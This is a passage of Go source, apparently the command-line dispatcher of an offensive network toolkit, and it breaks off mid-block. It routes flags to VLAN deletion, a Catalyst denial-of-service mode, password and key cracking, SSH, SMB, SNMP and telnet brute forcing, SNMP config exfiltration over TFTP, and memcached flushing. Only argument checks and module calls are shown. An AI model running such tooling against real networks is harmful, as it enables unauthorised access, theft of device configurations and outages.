			if flags.doAddVlan && !flags.doVTPAnalysis {
				fmt.Fprintln(os.Stderr, "--add-vlan requires --vtp")
				os.Exit(1)
			}
			if flags.doCatalystZeroDay && !flags.doVTPAnalysis {
				fmt.Fprintln(os.Stderr, "--catalyst-zero-day requires --vtp")
				os.Exit(1)
			}
			if flags.doCatalystZeroDay && !flags.doDos {
				fmt.Fprintln(os.Stderr, "--catalyst-zero-day requires --dos")
				os.Exit(1)
			}
			if flags.doDos && !flags.doCatalystZeroDay {
				fmt.Fprintln(os.Stderr, "--dos requires --catalyst-zero-day (use with --vtp -I)")
				os.Exit(1)
			}
			if flags.doDeleteVlan && flags.dstVLAN < 1 {
				fmt.Fprintln(os.Stderr, "--vtp --delete-vlan requires --dst-vlan <vlan_id>")
				os.Exit(1)
			}
			if flags.doAddVlan && flags.dstVLAN < 1 {
				fmt.Fprintln(os.Stderr, "--vtp --add-vlan requires --dst-vlan <vlan_id>")
				os.Exit(1)
			}
			if flags.vtpRevision >= 0 && !flags.doDeleteAllVlans && !flags.doDeleteVlan && !flags.doAddVlan && !flags.doCatalystZeroDay {
				fmt.Fprintln(os.Stderr, "--revision-number requires --vtp with --delete-all-vlans, --delete-vlan, --add-vlan, or --catalyst-zero-day")
				os.Exit(1)
			}

			if flags.doVTPAnalysis && flags.captureFile != "" {
				c := &vtpcrack.Cracker{
					PcapFile: flags.captureFile,
					Crack:    flags.doCrack,
					Wordlist: flags.wordlist,
				}
				if err := c.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] VTP: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doRSVPAnalysis {
				if flags.captureFile == "" {
					fmt.Fprintln(os.Stderr, "--rsvp requires --capture <pcap_file>")
					os.Exit(1)
				}
				c := &rsvpcrack.Cracker{
					PcapFile: flags.captureFile,
					Crack:    flags.doCrack,
					Wordlist: flags.wordlist,
				}
				if err := c.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] RSVP: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doISISAnalysis {
				if flags.captureFile == "" {
					fmt.Fprintln(os.Stderr, "--is-is requires --capture <pcap_file>")
					os.Exit(1)
				}
				c := &isiscrack.Cracker{
					PcapFile: flags.captureFile,
					Crack:    flags.doCrack,
					Wordlist: flags.wordlist,
				}
				if err := c.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] IS-IS: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doTACACSplusAnalysis {
				if flags.captureFile == "" {
					fmt.Fprintln(os.Stderr, "--tacacs-plus requires --capture <pcap_file>")
					os.Exit(1)
				}
				c := &tacacscrack.Cracker{
					PcapFile: flags.captureFile,
					Crack:    flags.doCrack,
					Wordlist: flags.wordlist,
				}
				if err := c.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] TACACS+: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doCiscoPass || ((flags.ciscoPassFile != "" || flags.hashValue != "") && !flags.doSSH) {
				if flags.ciscoPassFile != "" && flags.hashValue != "" {
					fmt.Fprintln(os.Stderr, "--file and --hash cannot be combined")
					os.Exit(1)
				}
				if flags.doCiscoPass && flags.ciscoPassFile == "" && flags.hashValue == "" {
					fmt.Fprintln(os.Stderr, "--cisco-pass requires --hash <value> or --file <path>")
					os.Exit(1)
				}
				if !flags.doType4 && !flags.doType5 && !flags.doType7 && !flags.doType8 && !flags.doType9 {
					fmt.Fprintln(os.Stderr, "specify --type4, --type5, --type7, --type8, or --type9")
					os.Exit(1)
				}
				if (flags.doType4 || flags.doType5 || flags.doType8 || flags.doType9) && flags.wordlist == "" {
					fmt.Fprintln(os.Stderr, "--type4/--type5/--type8/--type9 requires --wordlist")
					os.Exit(1)
				}
				c := &ciscopass.Cracker{
					ConfigFile: flags.ciscoPassFile,
					HashValue:  flags.hashValue,
					Type4:      flags.doType4,
					Type5:      flags.doType5,
					Type7:      flags.doType7,
					Type8:      flags.doType8,
					Type9:      flags.doType9,
					Wordlist:   flags.wordlist,
				}
				if err := c.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] CISCO-PASS: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doDHCPDiscover && !flags.doDHCPFlood {
				fmt.Fprintln(os.Stderr, "--discover requires --dhcp-flood")
				os.Exit(1)
			}
			if flags.doDHCPRelease && !flags.doDHCPFlood {
				fmt.Fprintln(os.Stderr, "--release requires --dhcp-flood")
				os.Exit(1)
			}

			if flags.doSTPFloodConf && !flags.doSTP {
				fmt.Fprintln(os.Stderr, "--flood-conf requires --stp")
				os.Exit(1)
			}
			if flags.doSTPFloodTCN && !flags.doSTP {
				fmt.Fprintln(os.Stderr, "--flood-tcn requires --stp")
				os.Exit(1)
			}
			if flags.doSTP && !flags.doHijack && !flags.doSTPFloodConf && !flags.doSTPFloodTCN {
				fmt.Fprintln(os.Stderr, "--stp requires --hijack, --flood-conf, or --flood-tcn")
				os.Exit(1)
			}
			stpFloodModes := 0
			if flags.doSTPFloodConf {
				stpFloodModes++
			}
			if flags.doSTPFloodTCN {
				stpFloodModes++
			}
			if stpFloodModes > 1 {
				fmt.Fprintln(os.Stderr, "--flood-conf and --flood-tcn cannot be combined")
				os.Exit(1)
			}
			if (flags.doSTPFloodConf || flags.doSTPFloodTCN) && (flags.doHijack || flags.doRSTP) {
				fmt.Fprintln(os.Stderr, "STP flood modes cannot be combined with --hijack or --rstp")
				os.Exit(1)
			}

			if flags.tftpServer != "" {
				if flags.getFiles == "" && flags.putFiles == "" {
					fmt.Fprintln(os.Stderr, "--tftp requires --get <files> or --put <files>")
					os.Exit(1)
				}
				if flags.getFiles != "" && flags.putFiles != "" {
					fmt.Fprintln(os.Stderr, "--get and --put cannot be combined")
					os.Exit(1)
				}
				tftpPort, err := ftpenum.ParseSinglePort(flags.port)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] TFTP: invalid --port: %v\n", err)
					os.Exit(1)
				}
				splitCSV := func(s string) []string {
					var out []string
					for _, f := range strings.Split(s, ",") {
						if f = strings.TrimSpace(f); f != "" {
							out = append(out, f)
						}
					}
					return out
				}
				c := &tftpenum.Client{
					Server:   flags.tftpServer,
					Port:     tftpPort,
					GetFiles: splitCSV(flags.getFiles),
					PutFiles: splitCSV(flags.putFiles),
				}
				if err := c.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] TFTP: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.ftpBounce != "" {
				var ports []int
				if flags.port != "" {
					var err error
					ports, err = ftpenum.ParsePortList(flags.port)
					if err != nil {
						fmt.Fprintf(os.Stderr, "[!] FTP-BOUNCE: %v\n", err)
						os.Exit(1)
					}
				}
				bs := &ftpenum.BounceScanner{
					CredServer: flags.ftpBounce,
					Ports:      ports,
				}
				if err := bs.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] FTP-BOUNCE: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.ftpServer != "" {
				if !flags.ftpAnon && !flags.ftpFeatures && flags.userList == "" && flags.passList == "" {
					fmt.Fprintln(os.Stderr, "--ftp requires --anon, --features, --userlist, or --passlist")
					os.Exit(1)
				}
				ftpPort, err := ftpenum.ParseSinglePort(flags.port)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] FTP: invalid --port: %v\n", err)
					os.Exit(1)
				}
				c := &ftpenum.Client{
					Server:   flags.ftpServer,
					Port:     ftpPort,
					Anon:     flags.ftpAnon,
					Features: flags.ftpFeatures,
					UserList: flags.userList,
					PassList: flags.passList,
				}
				if err := c.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] FTP: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doSSH {
				sshModes := 0
				if flags.doSSHAuthMethods {
					sshModes++
				}
				if flags.doSSHCipherEnum {
					sshModes++
				}
				if flags.doSSHKeyEnum {
					sshModes++
				}
				if flags.doSMBBrute {
					sshModes++
				}
				// Offline --file crack is a mode only when not used as key-enum key source.
				if flags.ciscoPassFile != "" && !flags.doSSHKeyEnum {
					sshModes++
				}
				if sshModes != 1 {
					fmt.Fprintln(os.Stderr, "--ssh requires exactly one of --auth-methods, --cipher-enum, --key-enum, --brute, or --file")
					os.Exit(1)
				}

				// Online public-key acceptance
				if flags.doSSHKeyEnum {
					if flags.snmpTarget == "" {
						fmt.Fprintln(os.Stderr, "--ssh --key-enum requires --target <ip>")
						os.Exit(1)
					}
					if flags.ciscoPassFile == "" {
						fmt.Fprintln(os.Stderr, "--ssh --key-enum requires --file <key-file|directory>")
						os.Exit(1)
					}
					if flags.smbUser == "" && flags.userList == "" {
						fmt.Fprintln(os.Stderr, "--ssh --key-enum requires --username <user> or --userlist <file>")
						os.Exit(1)
					}
					sshPort := 22
					if flags.port != "" {
						p, err := ftpenum.ParseSinglePort(flags.port)
						if err != nil {
							fmt.Fprintf(os.Stderr, "[!] SSH: invalid --port: %v\n", err)
							os.Exit(1)
						}
						sshPort = p
					}
					ke := &sshenum.KeyEnumer{
						Target:   flags.snmpTarget,
						Port:     sshPort,
						KeyPath:  flags.ciscoPassFile,
						Username: flags.smbUser,
						UserList: flags.userList,
					}
					if err := ke.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] SSH: %v\n", err)
						os.Exit(1)
					}
					return
				}

				// Offline private-key hash extract / crack (authentication-cracking).
				if flags.ciscoPassFile != "" {
					if flags.doCrack && flags.wordlist == "" {
						fmt.Fprintln(os.Stderr, "--ssh --crack requires --wordlist <file>")
						os.Exit(1)
					}
					if flags.wordlist != "" && !flags.doCrack {
						fmt.Fprintln(os.Stderr, "--wordlist requires --crack (use with --ssh --file)")
						os.Exit(1)
					}
					c := &sshcrack.Cracker{
						KeyFile:  flags.ciscoPassFile,
						Wordlist: flags.wordlist,
						Crack:    flags.doCrack,
					}
					if err := c.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] SSH: %v\n", err)
						os.Exit(1)
					}
					return
				}

				if flags.snmpTarget == "" {
					fmt.Fprintln(os.Stderr, "--ssh requires --target <ip>")
					os.Exit(1)
				}
				sshPort := 22
				if flags.port != "" {
					p, err := ftpenum.ParseSinglePort(flags.port)
					if err != nil {
						fmt.Fprintf(os.Stderr, "[!] SSH: invalid --port: %v\n", err)
						os.Exit(1)
					}
					sshPort = p
				}

				if flags.doSSHCipherEnum {
					ce := &sshenum.CipherEnumer{
						Target: flags.snmpTarget,
						Port:   sshPort,
					}
					if err := ce.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] SSH: %v\n", err)
						os.Exit(1)
					}
					return
				}

				if flags.smbUser == "" {
					fmt.Fprintln(os.Stderr, "--ssh requires --username <user>")
					os.Exit(1)
				}
				if flags.doSSHAuthMethods {
					probe := &sshenum.AuthMethodsProbe{
						Target:   flags.snmpTarget,
						Port:     sshPort,
						Username: flags.smbUser,
					}
					if err := probe.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] SSH: %v\n", err)
						os.Exit(1)
					}
					return
				}
				if flags.passList == "" {
					fmt.Fprintln(os.Stderr, "--ssh --brute requires --passlist <file>")
					os.Exit(1)
				}
				if flags.sshThreads < 0 {
					fmt.Fprintln(os.Stderr, "--threads must be >= 0 (0 or omitted uses default 16)")
					os.Exit(1)
				}
				if flags.sshThreads > 64 {
					fmt.Fprintln(os.Stderr, "--threads max is 64")
					os.Exit(1)
				}
				br := &sshenum.Bruter{
					Target:   flags.snmpTarget,
					Port:     sshPort,
					Username: flags.smbUser,
					PassList: flags.passList,
					Threads:  flags.sshThreads,
				}
				if err := br.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] SSH: %v\n", err)
					os.Exit(1)
				}
				return
			}
			if flags.doSSHAuthMethods {
				fmt.Fprintln(os.Stderr, "--auth-methods requires --ssh")
				os.Exit(1)
			}
			if flags.doSSHCipherEnum {
				fmt.Fprintln(os.Stderr, "--cipher-enum requires --ssh")
				os.Exit(1)
			}
			if flags.doSSHKeyEnum {
				fmt.Fprintln(os.Stderr, "--key-enum requires --ssh")
				os.Exit(1)
			}
			if flags.sshThreads != 0 && !((flags.doSSH || flags.doTelnet) && flags.doSMBBrute) {
				fmt.Fprintln(os.Stderr, "--threads requires --ssh --brute or --telnet --brute")
				os.Exit(1)
			}

			if flags.doSNMP {
				if flags.doConfigDump {
					if flags.doSNMPWalk || enumOn(flags) || flags.doSMBBrute || flags.memcachedSet == "true" {
						fmt.Fprintln(os.Stderr, "--snmp --config-dump cannot be combined with --walk, --enum, --brute, or --set")
						os.Exit(1)
					}
					if flags.snmpTarget == "" {
						fmt.Fprintln(os.Stderr, "--snmp --config-dump requires --target <ip>")
						os.Exit(1)
					}
					if flags.snmpTFTPServer == "" {
						fmt.Fprintln(os.Stderr, "--snmp --config-dump requires --tftp-server <ip>")
						os.Exit(1)
					}
					if flags.smbUser == "" {
						fmt.Fprintln(os.Stderr, "--snmp --config-dump requires --username <user>")
						os.Exit(1)
					}
					if flags.fhAuth != "" && flags.snmpAuthPass == "" {
						fmt.Fprintln(os.Stderr, "--auth requires --auth-pass")
						os.Exit(1)
					}
					if flags.snmpAuthPass != "" && flags.fhAuth == "" {
						fmt.Fprintln(os.Stderr, "--auth-pass requires --auth")
						os.Exit(1)
					}
					if flags.snmpPrivProto != "" && flags.snmpPrivPass == "" {
						fmt.Fprintln(os.Stderr, "--priv requires --priv-pass")
						os.Exit(1)
					}
					if flags.snmpPrivPass != "" && flags.snmpPrivProto == "" {
						fmt.Fprintln(os.Stderr, "--priv-pass requires --priv")
						os.Exit(1)
					}
					if flags.snmpPrivProto != "" && flags.fhAuth == "" {
						fmt.Fprintln(os.Stderr, "--priv requires --auth (privacy cannot be used without authentication)")
						os.Exit(1)
					}
					if flags.snmpV1 || flags.snmpV2c || flags.snmpCommunity != "" || flags.snmpOID != "" {
						fmt.Fprintln(os.Stderr, "--v1, --v2c, --community, and --oid are not used with --snmp --config-dump")
						os.Exit(1)
					}
					snmpPort := 161
					if flags.port != "" {
						p, err := ftpenum.ParseSinglePort(flags.port)
						if err != nil {
							fmt.Fprintf(os.Stderr, "[!] SNMP: invalid --port: %v\n", err)
							os.Exit(1)
						}
						snmpPort = p
					}
					cd := &snmpexfil.ConfigDumper{
						Target:     flags.snmpTarget,
						Port:       snmpPort,
						TFTPServer: flags.snmpTFTPServer,
						Username:   flags.smbUser,
						Auth:       flags.fhAuth,
						AuthPass:   flags.snmpAuthPass,
						Priv:       flags.snmpPrivProto,
						PrivPass:   flags.snmpPrivPass,
					}
					if err := cd.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] SNMP: %v\n", err)
						os.Exit(1)
					}
					return
				}
				if flags.memcachedSet == "true" {
					if flags.doSNMPWalk || enumOn(flags) || flags.doSMBBrute {
						fmt.Fprintln(os.Stderr, "--snmp --set cannot be combined with --walk, --enum, or --brute")
						os.Exit(1)
					}
					if flags.snmpV1 && flags.snmpV2c {
						fmt.Fprintln(os.Stderr, "--v1 and --v2c are mutually exclusive")
						os.Exit(1)
					}
					if !flags.snmpV1 && !flags.snmpV2c {
						fmt.Fprintln(os.Stderr, "--snmp --set requires --v1 or --v2c")
						os.Exit(1)
					}
					if flags.snmpCommunity == "" {
						fmt.Fprintln(os.Stderr, "--snmp --set requires --community <string>")
						os.Exit(1)
					}
					if flags.snmpTarget == "" {
						fmt.Fprintln(os.Stderr, "--snmp --set requires --target <ip|file>")
						os.Exit(1)
					}
					if flags.snmpOID == "" {
						fmt.Fprintln(os.Stderr, "--snmp --set requires --oid <oid>")
						os.Exit(1)
					}
					if flags.memcachedValue == "" {
						fmt.Fprintln(os.Stderr, "--snmp --set requires --value <data>")
						os.Exit(1)
					}
					if flags.snmpV3 {
						fmt.Fprintln(os.Stderr, "--v3 is not used with --snmp --set (use --snmp --config-dump for SNMPv3)")
						os.Exit(1)
					}
					snmpPort := 161
					if flags.port != "" {
						p, err := ftpenum.ParseSinglePort(flags.port)
						if err != nil {
							fmt.Fprintf(os.Stderr, "[!] SNMP: invalid --port: %v\n", err)
							os.Exit(1)
						}
						snmpPort = p
					}
					ver := snmpdata.SNMPVersion2c
					if flags.snmpV1 {
						ver = snmpdata.SNMPVersion1
					}
					st := &snmpdata.Setter{
						Target:    flags.snmpTarget,
						Port:      snmpPort,
						Community: flags.snmpCommunity,
						Version:   ver,
						OID:       flags.snmpOID,
						Value:     flags.memcachedValue,
					}
					if err := st.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] SNMP: %v\n", err)
						os.Exit(1)
					}
					return
				}
				if flags.doSNMPWalk {
					if enumOn(flags) {
						fmt.Fprintln(os.Stderr, "--snmp: use either --walk or --enum, not both")
						os.Exit(1)
					}
					if flags.doSMBBrute {
						fmt.Fprintln(os.Stderr, "--snmp: use either --walk or --brute, not both")
						os.Exit(1)
					}
					if !flags.snmpV2c {
						fmt.Fprintln(os.Stderr, "--snmp --walk requires --v2c")
						os.Exit(1)
					}
					if flags.snmpCommunity == "" {
						fmt.Fprintln(os.Stderr, "--snmp --walk requires --community <string>")
						os.Exit(1)
					}
					if flags.snmpTarget == "" {
						fmt.Fprintln(os.Stderr, "--snmp --walk requires --target <ip>")
						os.Exit(1)
					}
					if flags.ciscoPassFile != "" {
						fmt.Fprintln(os.Stderr, "--file is not used with --snmp --walk (use --community)")
						os.Exit(1)
					}
					if flags.passList != "" {
						fmt.Fprintln(os.Stderr, "--passlist is not used with --snmp --walk")
						os.Exit(1)
					}
					snmpPort := 161
					if flags.port != "" {
						p, err := ftpenum.ParseSinglePort(flags.port)
						if err != nil {
							fmt.Fprintf(os.Stderr, "[!] SNMP: invalid --port: %v\n", err)
							os.Exit(1)
						}
						snmpPort = p
					}
					w := &snmpenum.Walker{
						Target:    flags.snmpTarget,
						Port:      snmpPort,
						Community: flags.snmpCommunity,
						OIDs:      flags.snmpOID,
					}
					if err := w.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] SNMP: %v\n", err)
						os.Exit(1)
					}
					return
				}
				if enumOn(flags) {
					if flags.doSMBBrute {
						fmt.Fprintln(os.Stderr, "--snmp: use either --enum or --brute, not both")
						os.Exit(1)
					}
					if !flags.snmpV2c {
						fmt.Fprintln(os.Stderr, "--snmp --enum requires --v2c")
						os.Exit(1)
					}
					if flags.snmpCommunity == "" {
						fmt.Fprintln(os.Stderr, "--snmp --enum requires --community <string>")
						os.Exit(1)
					}
					if flags.snmpTarget == "" {
						fmt.Fprintln(os.Stderr, "--snmp --enum requires --target <ip>")
						os.Exit(1)
					}
					if flags.ciscoPassFile != "" {
						fmt.Fprintln(os.Stderr, "--file is not used with --snmp --enum (use --community)")
						os.Exit(1)
					}
					if flags.passList != "" {
						fmt.Fprintln(os.Stderr, "--passlist is not used with --snmp --enum")
						os.Exit(1)
					}
					if flags.snmpOID != "" {
						fmt.Fprintln(os.Stderr, "--oid with --snmp --enum is not supported (use --snmp --walk or --snmp --set)")
						os.Exit(1)
					}
					snmpPort := 161
					if flags.port != "" {
						p, err := ftpenum.ParseSinglePort(flags.port)
						if err != nil {
							fmt.Fprintf(os.Stderr, "[!] SNMP: invalid --port: %v\n", err)
							os.Exit(1)
						}
						snmpPort = p
					}
					en := &snmpenum.Enumerator{
						Target:    flags.snmpTarget,
						Port:      snmpPort,
						Community: flags.snmpCommunity,
					}
					if err := en.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] SNMP: %v\n", err)
						os.Exit(1)
					}
					return
				}
				if flags.doSMBBrute {
					if flags.snmpCommunity != "" || flags.snmpOID != "" {
						fmt.Fprintln(os.Stderr, "--community and --oid are not used with --snmp --brute")
						os.Exit(1)
					}
					if flags.snmpV2c && flags.snmpV3 {
						fmt.Fprintln(os.Stderr, "--v2c and --v3 are mutually exclusive with --snmp --brute")
						os.Exit(1)
					}
					if !flags.snmpV2c && !flags.snmpV3 {
						fmt.Fprintln(os.Stderr, "--snmp --brute requires --v2c or --v3")
						os.Exit(1)
					}
					if flags.ciscoPassFile != "" {
						fmt.Fprintln(os.Stderr, "--file is not used with --snmp --brute (use --passlist)")
						os.Exit(1)
					}
					if flags.snmpTarget == "" {
						fmt.Fprintln(os.Stderr, "--snmp --brute requires --target <ip>")
						os.Exit(1)
					}
					if flags.passList == "" {
						fmt.Fprintln(os.Stderr, "--snmp --brute requires --passlist <file>")
						os.Exit(1)
					}
					snmpPort := 161
					if flags.port != "" {
						p, err := ftpenum.ParseSinglePort(flags.port)
						if err != nil {
							fmt.Fprintf(os.Stderr, "[!] SNMP: invalid --port: %v\n", err)
							os.Exit(1)
						}
						snmpPort = p
					}
					if flags.snmpV2c && flags.userList != "" {
						fmt.Fprintln(os.Stderr, "--userlist is not used with --snmp --brute --v2c (use --v3)")
						os.Exit(1)
					}
					if flags.snmpV3 {
						if flags.userList == "" {
							fmt.Fprintln(os.Stderr, "--snmp --brute --v3 requires --userlist <file>")
							os.Exit(1)
						}
						br := &snmpenum.V3Bruter{
							Target:      flags.snmpTarget,
							Port:        snmpPort,
							UserList:    flags.userList,
							PassList:    flags.passList,
							RateLimitMS: flags.snmpRateMS,
						}
						if err := br.Run(); err != nil {
							fmt.Fprintf(os.Stderr, "[!] SNMP: %v\n", err)
							os.Exit(1)
						}
						return
					}
					br := &snmpenum.Bruter{
						Target:      flags.snmpTarget,
						Port:        snmpPort,
						PassList:    flags.passList,
						RateLimitMS: flags.snmpRateMS,
					}
					if err := br.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] SNMP: %v\n", err)
						os.Exit(1)
					}
					return
				}
				if flags.snmpV1 {
					fmt.Fprintln(os.Stderr, "--v1 is only used with --snmp --set")
					os.Exit(1)
				}
				if flags.snmpV2c || flags.snmpCommunity != "" || flags.snmpOID != "" {
					fmt.Fprintln(os.Stderr, "--v2c, --community, and --oid require --snmp --walk, --snmp --enum, or --snmp --set")
					os.Exit(1)
				}
				if flags.passList != "" {
					fmt.Fprintln(os.Stderr, "--passlist requires --snmp --brute")
					os.Exit(1)
				}
				if flags.snmpTarget == "" {
					fmt.Fprintln(os.Stderr, "--snmp requires --target <domain|ip|range>")
					os.Exit(1)
				}
				if flags.ciscoPassFile == "" {
					fmt.Fprintln(os.Stderr, "--snmp requires --file <community_file>")
					os.Exit(1)
				}
				sc := &snmpenum.Scanner{
					Target:        flags.snmpTarget,
					CommunityFile: flags.ciscoPassFile,
					RateLimitMS:   flags.snmpRateMS,
				}
				if err := sc.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] SNMP: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.snmpV1 || flags.snmpV2c || flags.snmpV3 || flags.snmpCommunity != "" || flags.snmpOID != "" || flags.doSNMPWalk || flags.doConfigDump {
				if !flags.doSNMP {
					fmt.Fprintln(os.Stderr, "--walk, --v1, --v2c, --v3, --community, --oid, and --config-dump require --snmp")
					os.Exit(1)
				}
				if !flags.doSNMPWalk && !enumOn(flags) && !(flags.doSMBBrute && flags.doSNMP) && flags.memcachedSet != "true" && !flags.doConfigDump {
					fmt.Fprintln(os.Stderr, "--v2c, --v3, --community, and --oid require --snmp --walk, --snmp --enum, --snmp --brute, --snmp --set, or --snmp --config-dump")
					os.Exit(1)
				}
			}
			if (flags.snmpTFTPServer != "" || flags.snmpAuthPass != "" || flags.snmpPrivProto != "" || flags.snmpPrivPass != "") && !flags.doSNMP {
				fmt.Fprintln(os.Stderr, "--tftp-server, --auth-pass, --priv, and --priv-pass require --snmp --config-dump")
				os.Exit(1)
			}
			if flags.doConfigDump && !flags.doSNMP {
				fmt.Fprintln(os.Stderr, "--config-dump requires --snmp")
				os.Exit(1)
			}

			if flags.doSMB {
				smbModes := 0
				if flags.doSMBVersion {
					smbModes++
				}
				if flags.doSMBBrute {
					smbModes++
				}
				if enumOn(flags) {
					smbModes++
				}
				if smbModes != 1 {
					fmt.Fprintln(os.Stderr, "--smb requires exactly one of --version, --brute, or --enum")
					os.Exit(1)
				}
			}
			if flags.doSMBVersion && !flags.doSMB {
				fmt.Fprintln(os.Stderr, "--version requires --smb")
				os.Exit(1)
			}
			if flags.doSMBBrute && !flags.doSMB && !flags.doSNMP && !flags.doSSH && !flags.doTelnet {
				fmt.Fprintln(os.Stderr, "--brute requires --smb, --snmp, --ssh, or --telnet")
				os.Exit(1)
			}
			if flags.doSMBBrute && flags.doSMB && flags.doSNMP {
				fmt.Fprintln(os.Stderr, "--brute cannot be used with both --smb and --snmp")
				os.Exit(1)
			}
			bruteMods := 0
			if flags.doSMB && flags.doSMBBrute {
				bruteMods++
			}
			if flags.doSNMP && flags.doSMBBrute {
				bruteMods++
			}
			if flags.doSSH && flags.doSMBBrute {
				bruteMods++
			}
			if flags.doTelnet && flags.doSMBBrute {
				bruteMods++
			}
			if bruteMods > 1 {
				fmt.Fprintln(os.Stderr, "--brute cannot be combined across --smb, --snmp, --ssh, and --telnet in one run")
				os.Exit(1)
			}
			if flags.doSMB && enumOn(flags) {
				if flags.snmpTarget == "" {
					fmt.Fprintln(os.Stderr, "--smb --enum requires --target <ip>")
					os.Exit(1)
				}
				if flags.smbPass != "" && flags.smbUser == "" {
					fmt.Fprintln(os.Stderr, "--password requires --username (with --smb --enum)")
					os.Exit(1)
				}
				smbPort := 445
				if flags.port != "" {
					p, err := ftpenum.ParseSinglePort(flags.port)
					if err != nil {
						fmt.Fprintf(os.Stderr, "[!] SMB: invalid --port: %v\n", err)
						os.Exit(1)
					}
					smbPort = p
				}
				en := &smbenum.Enumerator{
					Target:   flags.snmpTarget,
					Port:     smbPort,
					Username: flags.smbUser,
					Password: flags.smbPass,
				}
				if err := en.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] SMB: %v\n", err)
					os.Exit(1)
				}
				return
			}
			if flags.doSMB && flags.doSMBBrute {
				if flags.snmpTarget == "" {
					fmt.Fprintln(os.Stderr, "--smb --brute requires --target <ip>")
					os.Exit(1)
				}
				smbPort := 445
				if flags.port != "" {
					p, err := ftpenum.ParseSinglePort(flags.port)
					if err != nil {
						fmt.Fprintf(os.Stderr, "[!] SMB: invalid --port: %v\n", err)
						os.Exit(1)
					}
					smbPort = p
				}
				br := &smbenum.Bruter{
					Target:   flags.snmpTarget,
					Port:     smbPort,
					UserList: flags.userList,
					PassList: flags.passList,
				}
				if err := br.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] SMB: %v\n", err)
					os.Exit(1)
				}
				return
			}
			if flags.doSMB && flags.doSMBVersion {
				if flags.snmpTarget == "" {
					fmt.Fprintln(os.Stderr, "--smb --version requires --target <ip|range>")
					os.Exit(1)
				}
				smbPort := 445
				if flags.port != "" {
					p, err := ftpenum.ParseSinglePort(flags.port)
					if err != nil {
						fmt.Fprintf(os.Stderr, "[!] SMB: invalid --port: %v\n", err)
						os.Exit(1)
					}
					smbPort = p
				}
				sc := &smbvers.Scanner{Target: flags.snmpTarget, Port: smbPort}
				if err := sc.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] SMB: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doMemcached {
				mcModes := 0
				if enumOn(flags) {
					mcModes++
				}
				if flags.doMemcachedFlush {
					mcModes++
				}
				if flags.memcachedSet != "" && flags.memcachedSet != "true" {
					mcModes++
				}
				if flags.memcachedDelete != "" {
					mcModes++
				}
				if mcModes != 1 {
					fmt.Fprintln(os.Stderr, "--memcached requires exactly one of --enum [key], --flush-all, --set, or --delete")
					os.Exit(1)
				}
				if flags.snmpTarget == "" {
					fmt.Fprintln(os.Stderr, "--memcached requires --target <ip>")
					os.Exit(1)
				}
				mcPort := 11211
				if flags.port != "" {
					p, err := ftpenum.ParseSinglePort(flags.port)
					if err != nil {
						fmt.Fprintf(os.Stderr, "[!] MEMCACHED: invalid --port: %v\n", err)
						os.Exit(1)
					}
					mcPort = p
				}

				switch {
				case flags.doMemcachedFlush:
					fl := &mcdos.Flusher{Target: flags.snmpTarget, Port: mcPort}
					if err := fl.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] MEMCACHED: %v\n", err)
						os.Exit(1)
					}
				case flags.memcachedSet != "":
					key, val, err := parseMemcachedSet(flags.memcachedSet, flags.memcachedValue)
					if err != nil {
						fmt.Fprintf(os.Stderr, "[!] MEMCACHED: %v\n", err)
						os.Exit(1)
					}
					st := &mcdata.Setter{Target: flags.snmpTarget, Port: mcPort, Key: key, Value: val}
					if err := st.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] MEMCACHED: %v\n", err)
						os.Exit(1)
					}
				case flags.memcachedDelete != "":
					dl := &mcdata.Deleter{Target: flags.snmpTarget, Port: mcPort, Key: flags.memcachedDelete}
					if err := dl.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] MEMCACHED: %v\n", err)
						os.Exit(1)
					}
				default:
					if key := memcachedEnumKey(flags, args); key != "" {
						g := &mcget.Getter{Target: flags.snmpTarget, Port: mcPort, Key: key}
						if err := g.Run(); err != nil {
							fmt.Fprintf(os.Stderr, "[!] MEMCACHED: %v\n", err)
							os.Exit(1)
						}
					} else {
						en := &memcachedenum.Enumerator{Target: flags.snmpTarget, Port: mcPort}
						if err := en.Run(); err != nil {
							fmt.Fprintf(os.Stderr, "[!] MEMCACHED: %v\n", err)
							os.Exit(1)
						}
					}
				}
				return
			}

			if flags.doTelnet {
				telnetModes := 0
				if enumOn(flags) {
					telnetModes++
				}
				if flags.doSMBBrute {
					telnetModes++
				}
				if telnetModes != 1 {
					fmt.Fprintln(os.Stderr, "--telnet requires exactly one of --enum or --brute")
					os.Exit(1)
				}
				if flags.snmpTarget == "" {
					fmt.Fprintln(os.Stderr, "--telnet requires --target <ip>")
					os.Exit(1)
				}
				tnPort := 23
				if flags.port != "" {
